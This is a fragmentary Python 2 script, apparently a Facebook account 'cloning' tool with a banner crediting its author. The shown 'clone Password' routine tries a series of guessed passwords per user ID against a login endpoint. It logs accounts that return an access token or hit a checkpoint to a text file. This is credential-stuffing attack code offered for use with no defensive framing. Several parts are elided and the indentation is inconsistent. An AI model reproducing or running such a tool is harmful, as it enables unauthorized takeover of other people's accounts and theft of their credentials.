...
\033[1;97m ##     ##    ##           ##### ## \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;97m Code By     : SK Khogianai 

\033[1;97m Friends     : Khalil.khyber

\033[1;97m ram CH : fb id SK Khogianai 

\033[1;97m TLEGRAM GP  : No have
\033[1;97m--------------------------------------------------
"""
#call menu
def Furqan():
...
#clone Password
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m(Khogianai_OK) ' + k + c + user + ' | ' + pass1
                okb = open('Qasim.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;91m(Khogianai_CP) ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m(Khogianai_OK)' + k + c + user + ' | ' + pass2
                    okb = open('Qasim.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;91m(Khogianai_CP) ' + k + c + user + ' | ' + pass2
                    okb = open('Qasim.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m(Khogianai_OK) ' + k + c + user + ' | ' + pass3
                        okb = open('Qasim.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;91m(Khogianai_CP) ' + k + c + user + ' | ' + pass3
                        cps = open('Qasim.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m(Khogianai_OK) ' + k + c + user + ' | ' + pass4
                            okb = open('Qasim.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;91m(Khogianai_CP) ' + k + c + user + ' | ' + pass4
                            cps = open('Qasim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Khogianai_OK) ' + k + c + user + ' | ' + pass5
                                okb = open('Qasim.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Khogianai_CP) ' + k + c + user + ' | ' + pass5
                                cps = open('Qasim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Khogianai_OK) ' + k + c + user + ' | ' + pass6
                                okb = open('Qasim.txt', 'a')
                                okb.write(k + c + user + pass6 + '\n')
                                okb.close()
                                oks.append(c + user + pass6 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Khogianai_CP) ' + k + c + user + ' | ' + pass6
                                cps = open('Qasim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Khogianai_OK) ' + k + c + user + ' | ' + pass7
                                okb = open('Qasim.txt', 'a')
                                okb.write(k + c + user + pass7 + '\n')
                                okb.close()
                                oks.append(c + user + pass7 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Khogianai_CP) ' + k + c + user + ' | ' + pass7
                                cps = open('Qasim.txt', 'a')
